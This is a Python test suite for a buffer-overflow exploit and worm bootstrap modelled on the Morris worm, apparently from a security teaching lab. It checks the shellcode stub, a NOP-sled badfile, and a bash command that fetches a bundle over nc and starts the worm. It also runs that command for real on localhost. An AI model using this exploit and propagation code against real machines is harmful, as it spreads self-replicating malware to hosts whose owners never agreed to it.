"""The exploit for morris-bof, tested on this machine without Docker.

Where a test can, it runs the real thing: the command the shellcode carries is
run by bash, a stand-in bundle is pushed through a real socket with nc, and
the addresses are measured with the real `stack` when the host allows it.
"""

import hashlib
import io
import os
import shutil
import socket
import subprocess
import tarfile
import time
from pathlib import Path

import pytest

from software.Vulnerable_Server import MorrisBofExploit
from software.Vulnerable_Server.morris_bof.yom_morris_bof import exploit, aslr_setting

# sha256 of the first 51 bytes of the Morris worm's shellcode (worm.py). If
# this fails, the stub was edited: it has to stay exactly as it is there.
MORRIS_STUB_SHA256 = "f1becb2c638480a0d09da75ea0ead86bf00691cd9c3c4872d76d3ce5de6c6e80"
MORRIS_CONSTANTS = (0xFFFFD5E8, 0xFFFFD578)        # ebp, buf, as written in that worm.py
ASSETS = Path(exploit.__file__).parent.parent / "assets"


def free_port(kind=socket.SOCK_STREAM):
    with socket.socket(socket.AF_INET, kind) as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


# ---- the shellcode ----

def test_the_stub_is_the_morris_worm_s_byte_for_byte():
    assert hashlib.sha256(exploit._STUB).hexdigest() == MORRIS_STUB_SHA256
    assert exploit._STRINGS == b"AAAABBBBCCCCDDDD/bin/bash*-c*"


@pytest.mark.parametrize("ip", ["10.158.0.71", "255.255.255.255"])
def test_the_command_sits_inside_that_stub(ip):
    code = MorrisBofExploit(ebp=1, buf=1).shellcode(ip, 9998)
    assert len(code) == 51 + len(exploit._STRINGS) + exploit.COMMAND_ROOM + 1 == 260
    command = code[80:259].decode("ascii")
    assert len(command) == exploit.COMMAND_ROOM
    assert command.startswith("export FROM={};".format(ip))
    assert "mkdir /tmp/yomw||" in command            # never overwrite an infected machine
    assert code[259:] == b"*"                        # where the stub writes its terminator


def test_a_command_that_does_not_fit_is_refused(monkeypatch):
    monkeypatch.setattr(exploit, "COMMAND_ROOM", 20)
    with pytest.raises(ValueError, match="room for 20"):
        MorrisBofExploit(ebp=1, buf=1).shellcode("1.1.1.1", 9998)


@pytest.mark.parametrize("ip", ["10.158.0.74", "255.255.255.255"])
def test_the_command_is_valid_bash(ip):
    """A live test once shipped `{echo ...}`, which bash cannot parse. Ask bash itself."""
    checked = subprocess.run(["bash", "-n", "-c", exploit.bootstrap(ip, 9999, 9998)],
                             capture_output=True, text=True)
    assert checked.returncode == 0, checked.stderr


def test_the_command_tells_the_sender_about_an_infected_machine():
    command = exploit.bootstrap("10.158.0.74", 9999, 9998)
    assert command.startswith("export FROM=10.158.0.74;")
    assert "mkdir /tmp/yomw||{ echo A>/dev/udp/$FROM/9998;exit;};" in command
    assert len(exploit.bootstrap("255.255.255.255", 65535, 65535)) <= exploit.COMMAND_ROOM


def test_the_command_names_the_worm_and_nothing_of_this_exploit():
    """It unpacks the bundle and starts the worm: the exploit hands the bundle over."""
    assert exploit.bootstrap("10.0.0.1").endswith("cd /tmp/yomw;tar xzf ../yomw.tgz;python3 -m yom_worm run")


# ---- the command, run for real ----

def stand_in_bundle(path, marker):
    """A bundle whose worm does one thing: record that it was started, and by whom."""
    source = "import os\nopen({!r}, 'w').write('started by ' + os.environ.get('FROM', '?'))\n".format(str(marker))
    with tarfile.open(path, "w:gz") as archive:
        for name, text in (("yom_worm/__init__.py", ""), ("yom_worm/__main__.py", source)):
            info = tarfile.TarInfo(name)
            info.size = len(text)
            archive.addfile(info, io.BytesIO(text.encode()))


def push(path, port):
    """What the worm does after the exploit: wait for the listener, send everything.

    Like the worm, it then waits for the receiver to close first. Closing
    earlier would reset the connection while the receiver still has unread
    data, and the bundle would arrive cut off.
    """
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1) as sock:
                sock.sendall(path.read_bytes())
                sock.shutdown(socket.SHUT_WR)
                sock.settimeout(5)
                try:
                    while sock.recv(4096):
                        pass
                except OSError:
                    pass
                return
        except OSError:
            time.sleep(0.1)
    raise AssertionError("nobody listened for the bundle on port {}".format(port))


def run_like_a_victim(command, home):
    """Start the command the way the shellcode does: bash -c, with a connection as input."""
    ours, theirs = socket.socketpair()
    process = subprocess.Popen(
        ["bash", "-c", command], stdin=ours.fileno(), stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, env={"PATH": os.environ["PATH"], "HOME": str(home)},
    )
    ours.close()
    process.peer = theirs                 # kept open: the other end of the "exploit's" line
    return process


def test_the_command_really_works(tmp_path):
    """Run the shellcode's command for real, the way a victim would.

    Reading it is not enough. Two bash traps hid in this line, and both only
    show up when it runs: a brace group written without its space, and a port
    number that bash read as a file descriptor.
    """
    if shutil.which("nc") is None:
        pytest.skip("this test needs netcat")
    home, bundle = tmp_path / "w", tmp_path / "bundle.tgz"     # not w.tgz: the command writes that one
    bundle_port, answer_port = free_port(), free_port(socket.SOCK_DGRAM)
    marker = home / "ran.txt"
    stand_in_bundle(bundle, marker)
    command = exploit.bootstrap("127.0.0.1", bundle_port, answer_port, home=str(home))
    no_shell_setup = tmp_path / "home"                     # so the tester's own ~/.bashrc stays out
    no_shell_setup.mkdir()

    # The first time on this machine: the bundle lands and its worm starts.
    victim = run_like_a_victim(command, no_shell_setup)
    push(bundle, bundle_port)
    output = victim.communicate(timeout=20)[0].decode()
    assert victim.returncode == 0, output
    assert "Listening on" in output                         # nc's own words
    assert marker.read_text() == "started by 127.0.0.1"
    assert (home / "yom_worm" / "__main__.py").is_file()

    # The second time: nothing is unpacked again, and the sender is told so.
    answer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    answer.bind(("127.0.0.1", answer_port))
    answer.settimeout(5)
    victim = run_like_a_victim(command, no_shell_setup)
    push(bundle, bundle_port)
    assert victim.wait(timeout=20) == 0
    assert answer.recvfrom(16)[0].strip() == b"A"              # "already infected"
    assert (home / "ran.txt").read_text() == "started by 127.0.0.1"


def test_without_nc_the_machine_is_not_claimed(tmp_path):
    """Without nc there is no bundle, so the machine must stay unclaimed."""
    empty = tmp_path / "no-nc-here"
    empty.mkdir()
    home = tmp_path / "w"
    command = exploit.bootstrap("127.0.0.1", free_port(), free_port(socket.SOCK_DGRAM), home=str(home))
    victim = subprocess.run([shutil.which("bash"), "-c", command], stdin=subprocess.DEVNULL,
                            capture_output=True, timeout=20, env={"PATH": str(empty)})
    assert victim.returncode != 0 and b"not found" in victim.stderr
    assert not home.exists()


# ---- the badfile ----

def test_the_badfile_matches_the_morris_worm_s_layout():
    ebp, buf = MORRIS_CONSTANTS
    badfile = MorrisBofExploit(ebp=ebp, buf=buf).badfile("10.0.0.1", 9998)
    assert len(badfile) == 500
    offset = ebp - buf + 4                          # 116: where the return address sits
    assert int.from_bytes(badfile[offset:offset + 4], "little") == ebp + 40
    assert badfile[offset + 4:500 - 260] == b"\x90" * (240 - 120)   # it lands in the NOP sled
    assert badfile.endswith(b"*")                   # the shellcode is at the end


class FakeWorm:
    """Just enough of the worm for an exploit that asks it to do the networking."""

    def __init__(self):
        self.sent = []
        self.announce_port = free_port(socket.SOCK_DGRAM)
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.bind(("127.0.0.1", self.announce_port))
        self.udp.settimeout(0.5)

    def my_ip_toward(self, target):
        return "10.0.0.1"

    def exchange(self, ip, port, data, wait):
        self.sent.append((ip, port, data))

    def deliver(self, ip, port, data):
        self.sent.append((ip, port, data))
        return True

    def wait_answer(self, target):
        try:
            data, _ = self.udp.recvfrom(64)
        except socket.timeout:
            return None
        return {"a": "already", "arrived": "arrived"}[data.decode().strip().lower()]


def test_break_in_sends_the_exploit_then_the_bundle_and_reads_the_answer():
    worm = FakeWorm()
    part = MorrisBofExploit(ebp=MORRIS_CONSTANTS[0], buf=MORRIS_CONSTANTS[1])
    part.prepare(worm)
    worm.udp.sendto(b"ARRIVED", ("127.0.0.1", worm.announce_port))
    assert part.break_in("10.0.0.9", b"BUNDLE") == "arrived"
    assert [(ip, port) for ip, port, _ in worm.sent] == [("10.0.0.9", 9090), ("10.0.0.9", 9999)]
    assert worm.sent[0][2].startswith(b"\x90" * 116)      # the badfile: NOPs up to the return address
    assert b"export FROM=10.0.0.1;" in worm.sent[0][2]   # it tells the victim where to fetch the bundle
    assert worm.sent[1][2] == b"BUNDLE"


def test_break_in_reports_a_machine_that_never_listens():
    worm = FakeWorm()
    worm.deliver = lambda ip, port, data: False
    part = MorrisBofExploit(ebp=1, buf=1)
    part.prepare(worm)
    assert part.break_in("10.0.0.9", b"BUNDLE") is None


def test_break_in_refuses_to_guess_the_addresses():
    worm = FakeWorm()
    part = MorrisBofExploit()
    part.prepare(worm)
    with pytest.raises(RuntimeError, match="not measured"):
        part.break_in("10.0.0.9", b"BUNDLE")
    assert worm.sent == []


# ---- before the worm launches ----

def test_it_refuses_to_launch_while_aslr_is_on_and_says_how_to_fix_it(monkeypatch):
    monkeypatch.setattr(exploit, "aslr_setting", lambda: "2")
    part = MorrisBofExploit()
    problems = part.check_host()
    assert len(problems) == 1
    assert "randomize_va_space=2" in problems[0]
    assert "sudo sysctl -w kernel.randomize_va_space=0" in problems[0]
    assert "sudo sysctl -w kernel.randomize_va_space=2" in problems[0]
    assert part.ebp is None and part.buf is None    # nothing was measured


def test_it_measures_the_addresses_with_the_real_program_when_aslr_is_off(tmp_path, monkeypatch):
    """The same two numbers that worm.py has typed in, but measured here, not typed."""
    if aslr_setting() != "0":
        pytest.skip("switch ASLR off on this machine to measure real addresses")
    monkeypatch.chdir(tmp_path)
    probe = tmp_path / "stack"
    shutil.copy(exploit.ASSETS / "stack", probe)     # a copy, so the test never touches the original

    part = MorrisBofExploit(probe_binary=str(probe))
    assert part.check_host() == []
    assert part.ebp > part.buf and part.ebp - part.buf == MORRIS_CONSTANTS[0] - MORRIS_CONSTANTS[1]

    offset = part.ebp - part.buf + 4                 # and a badfile built from them has the same layout
    badfile = part.badfile("10.0.0.1", 9998)
    assert int.from_bytes(badfile[offset:offset + 4], "little") == part.ebp + 40
